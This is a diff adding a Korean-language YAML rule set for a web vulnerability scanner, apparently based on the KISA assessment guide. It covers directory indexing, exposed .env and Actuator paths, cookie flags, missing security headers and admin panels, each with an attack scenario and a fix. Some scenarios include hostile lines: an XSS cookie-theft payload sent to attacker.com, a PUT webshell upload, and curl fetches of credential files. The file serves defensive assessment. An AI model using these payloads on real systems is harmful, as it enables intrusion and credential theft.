@@ -1,0 +1,539 @@
+version: "2026.1"
+updated: "2026-05-21"
+source: "주요정보통신기반시설 기술적 취약점 분석·평가 방법 상세가이드 (KISA 2026) — X. Web Application(웹)"
+
+rules:
+
+  # ── DI: 디렉터리 인덱싱 ───────────────────────────────────────────────────────
+  - id: "WEB-DI"
+    ref: "DI"
+    category: "디렉터리 인덱싱"
+    severity: "HIGH"
+    cvss_estimate: "7.5"
+    exploitation_difficulty: "Easy"
+    check_type: "directory_indexing"
+    title: "디렉터리 인덱싱 노출"
+    description: >
+      웹 서버에서 디렉터리 파일 목록이 그대로 노출되고 있습니다.
+      설정 파일, 백업 파일, 소스코드 등 민감한 파일이 외부에 공개될 수 있습니다.
+    attack_vector: >
+      공격자가 브라우저에서 디렉터리 URL에 접근하면 파일 목록을 열람하고,
+      백업 파일(.bak, .sql), 설정 파일 등을 직접 다운로드할 수 있습니다.
+    attack_scenario: >
+      1. 브라우저에서 대상 디렉터리 URL 접근
+      2. Index of / 파일 목록 확인
+      3. 백업 파일(.sql, .bak, .tar.gz) 다운로드
+      4. DB 덤프 또는 소스코드에서 자격증명·비즈니스 로직 탈취
+    tools: ["burpsuite", "dirb", "gobuster", "wget"]
+    cve_references: []
+    lab_guide: "DVWA 또는 로컬 Apache에서 Options +Indexes 설정 후 실습 가능"
+    recommendation: "웹 서버 설정에서 디렉터리 인덱싱을 비활성화하세요. (Apache: Options -Indexes, Nginx: autoindex off)"
+
+  # ── EP: 에러 페이지 정보 노출 ─────────────────────────────────────────────────
+  - id: "WEB-EP"
+    ref: "EP"
+    category: "에러 페이지 적용 미흡"
+    severity: "MEDIUM"
+    cvss_estimate: "5.3"
+    exploitation_difficulty: "Easy"
+    check_type: "error_page_leakage"
+    title: "에러 페이지에서 시스템 정보 노출"
+    description: >
+      HTTP 에러 응답 페이지에서 서버 소프트웨어, 프레임워크, 디렉터리 경로,
+      스택 트레이스 등 민감한 시스템 정보가 노출됩니다.
+    attack_vector: >
+      에러 페이지에서 노출된 기술 스택, 설치 경로, 프레임워크 버전 정보를
+      기반으로 해당 버전에 알려진 CVE를 조회해 표적 공격에 활용합니다.
+    attack_scenario: >
+      1. 존재하지 않는 URL(/test123) 접근으로 404 에러 발생
+      2. 에러 페이지에서 Apache/2.4.49, PHP/7.4 등 버전 확인
+      3. CVE 데이터베이스에서 해당 버전 취약점 조회
+      4. 공개 PoC 코드로 취약점 익스플로잇
+    tools: ["curl", "nikto", "whatweb"]
+    cve_references: []
+    lab_guide: "Vulhub의 Apache/Nginx 취약 버전 환경에서 에러 페이지 정보 노출 확인 가능"
+    recommendation: "커스텀 에러 페이지를 적용하고 기술 스택 정보가 포함되지 않도록 설정하세요."
+
+  # ── IL: 정보 누출 — 서버 버전 ─────────────────────────────────────────────────
+  - id: "WEB-IL-01"
+    ref: "IL"
+    category: "정보 누출"
+    severity: "LOW"
+    cvss_estimate: "3.1"
+    exploitation_difficulty: "Easy"
+    check_type: "server_version"
+    title: "서버 소프트웨어 버전 정보 노출 (Server 헤더)"
+    description: >
+      HTTP 응답의 Server 또는 X-Powered-By 헤더에 서버 소프트웨어의
+      상세 버전 정보가 노출되어 있습니다.
+    attack_vector: >
+      노출된 버전 정보를 CVE 데이터베이스와 매핑하면 해당 버전에 알려진
+      취약점과 PoC 코드를 빠르게 파악하여 표적 공격에 활용할 수 있습니다.
+    attack_scenario: >
+      1. curl -I http://target 으로 Server 헤더 확인
+      2. Server: nginx/1.18.0 등 버전 식별
+      3. NVD/Exploit-DB에서 해당 버전 CVE 조회
+      4. 공개 익스플로잇 코드로 공격 수행
+    tools: ["curl", "whatweb", "nikto"]
+    cve_references: []
+    lab_guide: "Vulhub에서 버전별 서버 취약점 실습 환경 제공"
+    recommendation: "Server 헤더에서 버전 정보를 제거하세요. (Apache: ServerTokens Prod, Nginx: server_tokens off)"
+
+  # ── IL: 정보 누출 — 민감 파일 노출 ───────────────────────────────────────────
+  - id: "WEB-IL-02"
+    ref: "IL"
+    category: "정보 누출"
+    severity: "HIGH"
+    cvss_estimate: "7.5"
+    exploitation_difficulty: "Easy"
+    check_type: "sensitive_path"
+    paths:
+      - "/.env"
+      - "/.git/config"
+      - "/.git/HEAD"
+      - "/wp-config.php"
+      - "/.htaccess"
+      - "/config.php"
+    title: "민감 설정 파일 직접 노출 (.env, .git 등)"
+    description: >
+      환경 설정 파일 또는 소스코드 형상관리 파일이 웹에서 직접 접근 가능합니다.
+      DB 자격증명, API 키, 암호화 키 등이 평문으로 포함될 수 있습니다.
+    attack_vector: >
+      .env 파일에는 DB 비밀번호, 클라우드 API 키, JWT 시크릿이 평문으로 저장됩니다.
+      .git 폴더를 통해 전체 소스코드를 복원할 수 있습니다.
+    attack_scenario: >
+      1. curl http://target/.env 로 파일 다운로드
+      2. DB_PASSWORD, AWS_SECRET_KEY 등 자격증명 추출
+      3. 획득한 DB 자격증명으로 직접 DB 접속
+      4. git-dumper 도구로 .git에서 전체 소스코드 복원 후 추가 취약점 분석
+    tools: ["curl", "git-dumper", "trufflehog"]
+    cve_references: []
+    lab_guide: "로컬 Apache에서 .env 노출 시나리오로 실습 가능"
+    recommendation: "웹 서버 설정에서 .env, .git 경로에 대한 접근을 거부하세요. 민감 파일은 웹 루트 외부에 위치시키세요."
+
+  # ── IL: 정보 누출 — API 문서 노출 ─────────────────────────────────────────────
+  - id: "WEB-IL-03"
+    ref: "IL"
+    category: "정보 누출"
+    severity: "MEDIUM"
+    cvss_estimate: "5.3"
+    exploitation_difficulty: "Easy"
+    check_type: "sensitive_path"
+    paths:
+      - "/swagger-ui.html"
+      - "/swagger-ui/"
+      - "/api-docs"
+      - "/v1/api-docs"
+      - "/openapi.json"
+      - "/graphql"
+    title: "API 문서 공개 노출 (Swagger/GraphQL)"
+    description: >
+      API 문서(Swagger UI, GraphQL Playground 등)가 인증 없이 공개되어 있습니다.
+      전체 API 엔드포인트, 파라미터, 인증 방식이 노출됩니다.
+    attack_vector: >
+      API 문서에서 엔드포인트 구조를 파악하고 Authorization 헤더 조작,
+      IDOR, 파라미터 변조 등의 공격을 체계적으로 수행할 수 있습니다.
+    attack_scenario: >
+      1. /swagger-ui.html 접속으로 전체 API 목록 확인
+      2. 인증이 필요한 관리자 API 엔드포인트 식별
+      3. JWT 토큰 없이 직접 호출 시도 (인증 우회)
+      4. /api/users/{id} 형태 IDOR로 타 사용자 정보 접근
+    tools: ["burpsuite", "postman", "restler", "graphql-cop"]
+    cve_references: []
+    lab_guide: "crAPI(Completely Ridiculous API) 실습 환경 활용"
+    recommendation: "운영 환경에서 API 문서를 비활성화하거나, 인증 후에만 접근 가능하도록 설정하세요."
+
+  # ── IL: Spring Actuator 노출 ──────────────────────────────────────────────────
+  - id: "WEB-IL-04"
+    ref: "IL"
+    category: "정보 누출"
+    severity: "HIGH"
+    cvss_estimate: "7.5"
+    exploitation_difficulty: "Easy"
+    check_type: "sensitive_path"
+    paths:
+      - "/actuator"
+      - "/actuator/env"
+      - "/actuator/beans"
+      - "/actuator/heapdump"
+      - "/actuator/health"
+    title: "Spring Boot Actuator 엔드포인트 노출"
+    description: >
+      Spring Boot Actuator 관리 엔드포인트가 인증 없이 노출되어 있습니다.
+      환경변수(DB 자격증명, API 키), 힙 덤프 등 민감정보 탈취가 가능합니다.
+    attack_vector: >
+      /actuator/env에서 DB_PASSWORD, SPRING_DATASOURCE_PASSWORD 등을 추출하거나,
+      /actuator/heapdump 파일 분석으로 메모리 내 세션 토큰·자격증명을 탈취합니다.
+    attack_scenario: >
+      1. /actuator 접속으로 노출된 엔드포인트 목록 확인
+      2. /actuator/env에서 DB 자격증명, API 키 추출
+      3. /actuator/heapdump 다운로드 (수백 MB)
+      4. Eclipse MAT으로 힙 덤프 분석, 세션 토큰·자격증명 추출
+    tools: ["curl", "eclipse-mat", "jmap"]
+    cve_references: ["CVE-2022-22965"]
+    lab_guide: "Spring4Shell 취약 버전 Docker 환경에서 실습 가능"
+    recommendation: "Actuator 엔드포인트에 Spring Security 인증을 적용하고, 불필요한 엔드포인트는 비활성화하세요."
+
+  # ── SN: 데이터 평문 전송 ──────────────────────────────────────────────────────
+  - id: "WEB-SN"
+    ref: "SN"
+    category: "데이터 평문 전송"
+    severity: "MEDIUM"
+    cvss_estimate: "5.9"
+    exploitation_difficulty: "Medium"
+    check_type: "http_plaintext"
+    title: "HTTPS 미적용 — 데이터 평문 전송 가능성"
+    description: >
+      웹 서비스가 HTTPS 없이 HTTP로만 운영되어 모든 데이터가 평문으로 전송됩니다.
+      로그인 자격증명, 세션 쿠키, 개인정보가 네트워크에서 노출됩니다.
+    attack_vector: >
+      동일 네트워크(공용 Wi-Fi 등)에서 Wireshark로 HTTP 트래픽을 캡처하면
+      사용자 자격증명과 세션 쿠키를 평문으로 획득할 수 있습니다.
+    attack_scenario: >
+      1. 공격자가 동일 네트워크에서 ARP Spoofing으로 MITM 위치 확보
+      2. Wireshark로 HTTP(80) 트래픽 캡처
+      3. POST /login 파라미터에서 username/password 평문 확인
+      4. 탈취한 세션 쿠키로 세션 하이재킹
+    tools: ["wireshark", "bettercap", "mitmproxy"]
+    cve_references: []
+    lab_guide: "로컬 네트워크 환경에서 HTTP 사이트 패킷 캡처 실습 가능"
+    recommendation: "HTTPS를 즉시 적용하고, HTTP 요청을 HTTPS로 자동 리다이렉트하도록 설정하세요."
+
+  # ── IS/CC: 세션 관리 미흡 — Cookie HttpOnly ────────────────────────────────────
+  - id: "WEB-IS-01"
+    ref: "IS"
+    category: "불충분한 세션 관리"
+    severity: "MEDIUM"
+    cvss_estimate: "5.4"
+    exploitation_difficulty: "Medium"
+    check_type: "cookie_flag"
+    flag: "httponly"
+    title: "세션 쿠키 HttpOnly 플래그 미설정"
+    description: >
+      세션 쿠키에 HttpOnly 속성이 없어 JavaScript로 쿠키 값에 접근 가능합니다.
+      XSS 취약점이 있을 경우 세션 토큰이 즉시 탈취됩니다.
+    attack_vector: >
+      XSS 취약점을 통해 삽입된 스크립트가 document.cookie로 세션 쿠키를 읽어
+      공격자 서버로 전송합니다.
+    attack_scenario: >
+      1. XSS 취약점 발견
+      2. <script>document.location='http://attacker.com/steal?c='+document.cookie</script> 삽입
+      3. 피해자가 페이지 접근 시 세션 쿠키 공격자 서버로 전송
+      4. 탈취된 쿠키로 세션 하이재킹
+    tools: ["burpsuite", "browser DevTools"]
+    cve_references: []
+    lab_guide: "DVWA XSS 실습 모듈에서 세션 하이재킹 시나리오 연습 가능"
+    recommendation: "모든 세션 쿠키에 HttpOnly 속성을 추가하세요. (Set-Cookie: session=...; HttpOnly)"
+
+  # ── IS/CC: 세션 관리 미흡 — Cookie Secure ─────────────────────────────────────
+  - id: "WEB-IS-02"
+    ref: "IS"
+    category: "불충분한 세션 관리"
+    severity: "MEDIUM"
+    cvss_estimate: "5.9"
+    exploitation_difficulty: "Medium"
+    check_type: "cookie_flag"
+    flag: "secure"
+    title: "세션 쿠키 Secure 플래그 미설정"
+    description: >
+      세션 쿠키에 Secure 속성이 없어 HTTP 연결에서도 쿠키가 전송됩니다.
+      SSL Stripping 공격으로 HTTPS를 HTTP로 다운그레이드하면 쿠키가 평문 노출됩니다.
+    attack_vector: >
+      MITM 환경에서 sslstrip으로 HTTPS를 HTTP로 다운그레이드하면 Secure 속성이 없는
+      쿠키가 HTTP 요청에도 포함되어 네트워크에서 캡처됩니다.
+    attack_scenario: >
+      1. ARP Spoofing으로 MITM 위치 확보
+      2. sslstrip으로 HTTPS → HTTP 다운그레이드
+      3. HTTP 요청에서 세션 쿠키 평문 캡처
+      4. 탈취된 세션 쿠키로 인증 우회
+    tools: ["sslstrip", "bettercap", "mitmproxy"]
+    cve_references: []
+    lab_guide: "DVWA + MITM 환경에서 SSL Stripping + 세션 하이재킹 실습"
+    recommendation: "HTTPS를 사용하는 쿠키에 Secure 속성을 추가하세요. (Set-Cookie: session=...; Secure)"
+
+  # ── CC: 쿠키 변조 — SameSite ──────────────────────────────────────────────────
+  - id: "WEB-CC"
+    ref: "CC"
+    category: "쿠키 변조"
+    severity: "LOW"
+    cvss_estimate: "3.5"
+    exploitation_difficulty: "Medium"
+    check_type: "cookie_flag"
+    flag: "samesite"
+    title: "쿠키 SameSite 속성 미설정 — CSRF 위험"
+    description: >
+      세션 쿠키에 SameSite 속성이 설정되지 않아 외부 사이트에서의 요청에도
+      쿠키가 포함됩니다. CSRF 공격에 취약해집니다.
+    attack_vector: >
+      공격자가 악의적인 사이트에 숨겨진 폼을 배치하면, 피해자가 방문 시
+      자동으로 피해자의 쿠키로 인증된 요청이 전송됩니다.
+    attack_scenario: >
+      1. 공격자 사이트에 hidden 폼 배치 (target 사이트의 비밀번호 변경 API)
+      2. 피해자가 공격자 사이트 방문 시 자동으로 폼 제출
+      3. 피해자 쿠키가 포함된 요청이 target 서버로 전송
+      4. 피해자 계정 비밀번호 변경 완료
+    tools: ["burpsuite", "browser"]
+    cve_references: []
+    lab_guide: "DVWA CSRF 모듈에서 실습 가능"
+    recommendation: "쿠키에 SameSite=Lax 또는 SameSite=Strict 속성을 추가하세요."
+
+  # ── AE: 관리자 페이지 노출 ────────────────────────────────────────────────────
+  - id: "WEB-AE"
+    ref: "AE"
+    category: "관리자 페이지 노출"
+    severity: "HIGH"
+    cvss_estimate: "7.3"
+    exploitation_difficulty: "Easy"
+    check_type: "sensitive_path"
+    paths:
+      - "/admin"
+      - "/admin/login"
+      - "/administrator"
+      - "/wp-admin/"
+      - "/console"
+      - "/phpmyadmin"
+      - "/phpMyAdmin"
+      - "/manager/html"
+    title: "관리자 페이지 외부 노출"
+    description: >
+      관리자 로그인 페이지 또는 관리 콘솔이 인터넷에서 직접 접근 가능합니다.
+      무차별 대입 공격(Brute Force)의 표적이 됩니다.
+    attack_vector: >
+      공개된 관리자 URL에 자동화 도구로 자격증명 무차별 대입 공격을 수행합니다.
+      또는 기본 자격증명(admin:admin, admin:password)으로 로그인을 시도합니다.
+    attack_scenario: >
+      1. /admin 또는 /wp-admin 접근 가능 확인
+      2. Hydra로 자격증명 무차별 대입 공격
+      3. admin:admin, admin:123456 등 기본 자격증명 시도
+      4. 관리자 권한 획득 → 서버 제어 (파일 업로드, 셸 획득)
+    tools: ["hydra", "burpsuite", "wfuzz", "medusa"]
+    cve_references: []
+    lab_guide: "DVWA 또는 WordPress 취약 버전 환경에서 관리자 페이지 공격 실습 가능"
+    recommendation: "관리자 페이지에 IP 기반 접근 제어를 적용하고, MFA(다중 인증)를 설정하세요."
+
+  # ── XS: XSS 방어 헤더 미설정 (CSP) ─────────────────────────────────────────────
+  - id: "WEB-XS"
+    ref: "XS"
+    category: "크로스사이트 스크립팅"
+    severity: "MEDIUM"
+    cvss_estimate: "5.4"
+    exploitation_difficulty: "Medium"
+    check_type: "missing_header"
+    header: "content-security-policy"
+    title: "CSP(Content-Security-Policy) 미설정 — XSS 방어 부재"
+    description: >
+      CSP 헤더가 없어 XSS 공격 시 인라인 스크립트 실행, 외부 스크립트 로드를
+      브라우저 수준에서 차단할 수 없습니다.
+    attack_vector: >
+      XSS 취약점이 존재할 경우 CSP가 없으면 인라인 스크립트 실행과 외부 악성
+      스크립트 로드가 모두 허용되어 공격 범위가 크게 확대됩니다.
+    attack_scenario: >
+      1. XSS 취약점을 통해 악의적인 스크립트 삽입
+      2. CSP 부재로 인라인 스크립트 자유롭게 실행
+      3. document.cookie로 세션 쿠키 탈취, 외부 서버 전송
+      4. 또는 피싱 페이지 동적 삽입으로 자격증명 탈취
+    tools: ["burpsuite", "xsstrike", "dalfox"]
+    cve_references: []
+    lab_guide: "DVWA XSS(Stored/Reflected) 모듈에서 CSP 없는 환경 실습 가능"
+    recommendation: "Content-Security-Policy 헤더를 추가하고 허용된 스크립트 소스를 명시적으로 제한하세요."
+
+  # ── CF: Clickjacking / CSRF — X-Frame-Options 미설정 ─────────────────────────
+  - id: "WEB-CF"
+    ref: "CF"
+    category: "크로스사이트 요청 위조(CSRF)"
+    severity: "MEDIUM"
+    cvss_estimate: "4.3"
+    exploitation_difficulty: "Easy"
+    check_type: "missing_header"
+    header: "x-frame-options"
+    title: "X-Frame-Options 미설정 — Clickjacking/CSRF 취약"
+    description: >
+      X-Frame-Options 헤더가 없어 공격자가 타 사이트의 iframe에 이 페이지를 삽입할 수 있습니다.
+      Clickjacking 및 CSRF 공격 위험이 증가합니다.
+    attack_vector: >
+      공격자 사이트에서 iframe으로 피해 사이트를 투명하게 오버레이하면,
+      피해자는 공격자 UI를 클릭하는 것처럼 보이지만 실제로는 피해 사이트를 조작합니다.
+    attack_scenario: >
+      1. 공격자 사이트에 피해 사이트를 투명 iframe으로 삽입
+      2. CSS로 iframe을 투명하게 설정(opacity: 0)
+      3. 피해자가 공격자 UI 클릭 시 실제로는 피해 사이트의 버튼 클릭
+      4. 의도치 않은 결제, 비밀번호 변경, 계정 삭제 등 유발
+    tools: ["burpsuite", "browser"]
+    cve_references: []
+    lab_guide: "DVWA Clickjacking 실습 또는 WebGoat CSRF 모듈 활용"
+    recommendation: "X-Frame-Options: DENY 또는 SAMEORIGIN 헤더를 추가하거나 CSP의 frame-ancestors 지시어를 사용하세요."
+
+  # ── WM: 불필요한 HTTP Method 허용 ──────────────────────────────────────────────
+  - id: "WEB-WM"
+    ref: "WM"
+    category: "불필요한 Method 악용"
+    severity: "MEDIUM"
+    cvss_estimate: "5.3"
+    exploitation_difficulty: "Easy"
+    check_type: "dangerous_methods"
+    dangerous: ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]
+    title: "위험한 HTTP Method 활성화 (PUT/DELETE/TRACE)"
+    description: >
+      웹 서버에서 PUT, DELETE, TRACE 등 불필요한 HTTP 메서드가 허용되고 있습니다.
+      PUT으로 임의 파일 업로드, TRACE로 쿠키 탈취가 가능합니다.
+    attack_vector: >
+      PUT 메서드로 웹쉘 파일을 업로드하거나, TRACE 메서드를 활용한
+      Cross-Site Tracing(XST) 공격으로 HttpOnly 쿠키를 우회하여 탈취할 수 있습니다.
+    attack_scenario: >
+      1. OPTIONS 요청으로 허용된 메서드 확인
+      2. PUT /shell.php HTTP/1.1 로 웹쉘 업로드
+      3. 업로드된 웹쉘(http://target/shell.php?cmd=id)로 RCE 달성
+      4. 또는 TRACE 메서드로 XST 공격 수행, HttpOnly 쿠키 탈취
+    tools: ["curl", "burpsuite", "nmap"]
+    cve_references: []
+    lab_guide: "WebDAV 설정된 Apache 환경에서 PUT 메서드 웹쉘 업로드 실습 가능"
+    recommendation: "GET, POST, HEAD만 허용하고 PUT, DELETE, TRACE, OPTIONS는 비활성화하세요."
+
+  # ── SN: HSTS 미설정 ────────────────────────────────────────────────────────────
+  - id: "WEB-SN-02"
+    ref: "SN"
+    category: "데이터 평문 전송"
+    severity: "MEDIUM"
+    cvss_estimate: "4.8"
+    exploitation_difficulty: "Medium"
+    check_type: "missing_header"
+    header: "strict-transport-security"
+    apply_to_ssl: true
+    title: "HSTS(HTTP Strict Transport Security) 미설정"
+    description: >
+      HTTPS 서비스에 HSTS 헤더가 설정되지 않아 SSL Stripping 공격으로
+      HTTP 다운그레이드가 가능합니다.
+    attack_vector: >
+      MITM 환경에서 sslstrip으로 HTTPS를 HTTP로 다운그레이드하면
+      HSTS가 없는 사이트의 사용자는 이를 인지하지 못한 채 평문으로 통신합니다.
+    attack_scenario: >
+      1. ARP Spoofing으로 MITM 위치 확보
+      2. sslstrip/bettercap으로 HTTPS → HTTP 다운그레이드
+      3. 사용자 자격증명 평문 캡처
+      4. 탈취된 자격증명으로 계정 탈취
+    tools: ["sslstrip", "bettercap", "mitmproxy"]
+    cve_references: []
+    lab_guide: "로컬 MITM 환경 구성 후 sslstrip 실습 가능"
+    recommendation: "Strict-Transport-Security: max-age=31536000; includeSubDomains 헤더를 추가하세요."
+
+  # ── IL: 관리자 페이지 인터넷 노출 ─────────────────────────────────────────────
+  - id: "WEB-IL-ADMIN"
+    ref: "IL"
+    category: "정보 노출"
+    severity: "MEDIUM"
+    cvss_estimate: "5.3"
+    exploitation_difficulty: "Easy"
+    check_type: "admin_panel"
+    title: "관리자 페이지 인터넷 노출"
+    description: >
+      관리자 페이지가 인터넷에서 직접 접근 가능한 상태입니다.
+      인증 요구 여부와 관계없이 관리자 인터페이스의 존재가 외부에 노출되면
+      공격자가 브루트포스, 자격증명 스터핑, 알려진 취약점 공격을 시도할 수 있습니다.
+    attack_vector: >
+      공격자가 관리자 로그인 페이지를 발견하여 자격증명을 시도하거나,
+      관리자 인터페이스에서 알려진 CVE를 악용합니다.
+    attack_scenario: >
+      1. /admin, /administrator 등 관리자 경로 탐색
+      2. 관리자 로그인 페이지 발견
+      3. 알려진 기본 자격증명 또는 이전에 탈취된 자격증명으로 로그인 시도
+      4. 관리자 권한으로 사용자 관리, 설정 변경, 데이터 열람
+    tools: ["burpsuite", "dirb", "gobuster"]
+    cve_references: []
+    lab_guide: "인터넷 노출 범위 제한 또는 IP 화이트리스트 적용"
+    recommendation: >
+      관리자 페이지 접근을 내부망 또는 VPN으로 제한하고, IP 화이트리스트를 적용하세요.
+      불가능한 경우 2단계 인증(MFA)을 필수 적용하세요.
+    cwe: "CWE-284"
+    kisa_category: "접근통제"
+    owasp: "A05:2021 - 보안 설정 오류"
+
+  # ── IL: 관리자 API 무인증 노출 ─────────────────────────────────────────────────
+  - id: "WEB-IL-ADMIN-API"
+    ref: "IL"
+    category: "정보 노출"
+    severity: "HIGH"
+    cvss_estimate: "7.5"
+    exploitation_difficulty: "Easy"
+    check_type: "admin_api"
+    title: "관리자/내부 API 무인증 노출 — 민감 데이터 열람 가능"
+    description: >
+      인증 없이 접근 가능한 관리자 또는 내부 API 엔드포인트가 발견되었습니다.
+      응답에 사용자 목록, 설정 정보, 권한 정보 등 민감한 데이터가 포함되어 있습니다.
+    attack_vector: >
+      인증 헤더 없이 /api/users, /api/admin 등 내부 API에 GET 요청을 전송하면
+      사용자 정보나 시스템 설정이 JSON 형태로 반환됩니다.
+    attack_scenario: >
+      1. 관리자 API 경로 탐색: /api/admin, /api/users, /api/config
+      2. 인증 토큰 없이 GET 요청 전송
+      3. 사용자 목록·권한·설정·시스템 정보 열람
+      4. 탈취한 정보를 활용한 계정 탈취 또는 횡적 이동
+    tools: ["burpsuite", "curl"]
+    cve_references: []
+    lab_guide: "OWASP BOLA (IDOR) 실습"
+    recommendation: >
+      모든 API 엔드포인트에 인증·인가를 적용하세요.
+      /api/admin, /api/internal 경로는 IP 화이트리스트 또는 내부망으로 제한하세요.
+    cwe: "CWE-285"
+    kisa_category: "접근통제"
+    owasp: "A01:2021 - 접근 제어 취약점"
+
+  # ── IL: 프레임워크/빌드 정보 노출 ──────────────────────────────────────────────
+  - id: "WEB-IL-FRAMEWORK"
+    ref: "IL"
+    category: "정보 노출"
+    severity: "LOW"
+    cvss_estimate: "3.1"
+    exploitation_difficulty: "Easy"
+    check_type: "framework_info"
+    title: "SPA 프레임워크/빌드 도구 정보 노출"
+    description: >
+      웹 페이지에서 사용 중인 프레임워크(Next.js, Vue.js, Angular 등) 및
+      빌드 도구(Webpack 등) 정보가 노출되어 있습니다.
+      __NEXT_DATA__, __NUXT__, sourceMappingURL 등을 통해 기술 스택이 식별됩니다.
+    attack_vector: >
+      공격자가 프레임워크 버전과 관련 알려진 CVE를 검색하여 특정 취약점을 겨냥한
+      공격을 수행할 수 있습니다. Source Map이 노출된 경우 원본 소스코드 복구가 가능합니다.
+    attack_scenario: >
+      1. 응답 HTML에서 __NEXT_DATA__, webpack 런타임 탐지
+      2. 프레임워크 버전 식별
+      3. 해당 버전의 알려진 CVE 검색
+      4. 취약점 익스플로잇 또는 Source Map을 통한 소스코드 분석
+    tools: ["burpsuite", "wappalyzer", "retire.js"]
+    cve_references: []
+    lab_guide: "Wappalyzer 브라우저 확장으로 기술 스택 분석"
+    recommendation: >
+      프로덕션 빌드에서 source map 파일을 제거하거나 내부망으로 제한하세요.
+      __NEXT_DATA__에 민감한 서버 사이드 데이터가 포함되지 않도록 필터링하세요.
+    cwe: "CWE-200"
+    kisa_category: "정보 노출"
+    owasp: "A05:2021 - 보안 설정 오류"
+
+  # ── AU: User Enumeration ──────────────────────────────────────────────────────
+  - id: "WEB-AU-ENUM"
+    ref: "AU"
+    category: "인증"
+    severity: "LOW"
+    cvss_estimate: "5.3"
+    exploitation_difficulty: "Easy"
+    check_type: "user_enumeration"
+    title: "User Enumeration — 로그인 오류 메시지로 계정 존재 여부 판별 가능"
+    description: >
+      로그인 폼에서 존재하지 않는 계정과 비밀번호 오류에 대해 서로 다른 응답을 반환하여
+      공격자가 계정의 존재 여부를 판별할 수 있습니다.
+    attack_vector: >
+      '계정이 존재하지 않습니다' vs '비밀번호가 틀렸습니다' 응답 차이를 이용하여
+      이메일/아이디 목록의 유효성을 확인하고, 이후 크리덴셜 스터핑에 활용합니다.
+    attack_scenario: >
+      1. 로그인 폼 발견
+      2. 존재하지 않는 계정으로 로그인 시도
+      3. 응답 메시지/상태코드/길이 차이 확인
+      4. 확보한 유효 계정 목록으로 크리덴셜 스터핑 수행
+    tools: ["burpsuite", "hydra"]
+    cve_references: []
+    lab_guide: "PortSwigger Username Enumeration Labs"
+    recommendation: >
+      로그인 실패 시 '계정 정보를 확인하세요'와 같이 계정 존재 여부를 알 수 없는
+      통일된 오류 메시지를 사용하세요.
+    cwe: "CWE-204"
+    kisa_category: "인증"
+    owasp: "A07:2021 - 식별 및 인증 실패"
